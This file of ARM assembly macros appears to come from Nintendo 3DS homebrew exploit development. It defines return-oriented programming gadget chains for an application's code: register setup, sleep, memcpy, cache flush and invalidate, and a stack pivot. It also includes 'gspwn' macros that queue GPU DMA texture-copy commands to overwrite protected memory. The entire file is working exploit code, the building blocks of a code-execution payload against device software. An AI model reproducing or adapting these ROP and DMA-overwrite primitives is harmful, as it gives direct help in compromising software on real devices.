.macro set_lr,_lr
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word ROP_SMD_NOP ; pop {pc}
	.word ROP_SMD_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word SMD_SVC_SLEEPTHREAD
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word SMD_MEMCPY
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word SMD_GSPGPU_FLUSHDATACACHE
.endmacro

.macro invalidate_dcache,addr,size
	set_lr ROP_SMD_NOP
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word SMD_GSPGPU_INVALIDATEDATACACHE
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_SMD_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word @@gxCommandPayload ; r1 (cmd addr)
	.word SMD_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro jump_sp,dst
    .word ROP_SMD_POP_R0PC ; pop {r0, pc}
        .word dst
    .word ROP_SMD_POP_R1PC
        .word ROP_SMD_NOP
    .word ROP_SMD_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0xDEADBABE ; r2 (garbage)
		.word ROP_SMD_NOP
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	
	.word ROP_SMD_MOV_SPR0_MOV_R0R2_MOV_LRR3_BXR1
.endmacro

.macro ldr_add_r0,addr,addval
	.word ROP_SMD_POP_R0PC
		.word addr
	.word ROP_SMD_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_SMD_ADD_R0R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro ldr_ldr_add_r0,addr,addval
	.word ROP_SMD_POP_R0PC
		.word addr
	.word ROP_SMD_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_SMD_LDR_R0R0_POP_R4PC
		.word addval ; r4
	.word ROP_SMD_ADD_R0R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_r0,addr
	.word ROP_SMD_POP_R4PC
		.word addr
	.word ROP_SMD_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_val,addr,val
	.word ROP_SMD_POP_R0PC
		.word val
	str_r0 addr
.endmacro

.macro cmp_derefptr_r0addr,const,condr0
	.word ROP_SMD_LDR_R0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_SMD_ADD_R0R0R4_POP_R4PC
		.word condr0 ; r4 (new value for r0 if [r0] == const)
	.word ROP_SMD_CMP_R0x0_MVNNE_R0x0_MOVEQ_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro cmpne_derefptr_r0addr,const,condr0
	.word ROP_SMD_LDR_R0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_SMD_ADD_R0R0R4_POP_R4PC
		.word condr0 ; r4 (new value for r0 if [r0] == const)
	.word ROP_SMD_CMP_R0x0_MVNEQ_R0x0_MOVNE_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro gspwn_dstderefadd,dst_base,dst_offset_ptr,src,size
	ldr_add_r0 dst_offset_ptr, dst_base 
	str_r0 @@gxCommandPayload + 0x8
	set_lr ROP_SMD_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word @@gxCommandPayload ; r1 (cmd addr)
	.word SMD_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word size ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspwn_srcderefadd,dst,src_base,src_offset_ptr,size
	ldr_add_r0 src_offset_ptr, src_base 
	str_r0 @@gxCommandPayload + 0x4
	set_lr ROP_SMD_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_SMD_POP_R0PC ; pop {r0, pc}
		.word SMD_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_SMD_POP_R1PC ; pop {r1, pc}
		.word @@gxCommandPayload ; r1 (cmd addr)
	.word SMD_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word 0xDEADBABE ; source address (standin, will be filled in)
		.word dst ; destination address 
		.word size ; size
		.word 0x00000000 ; dim in
		.word 0x00000000 ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro
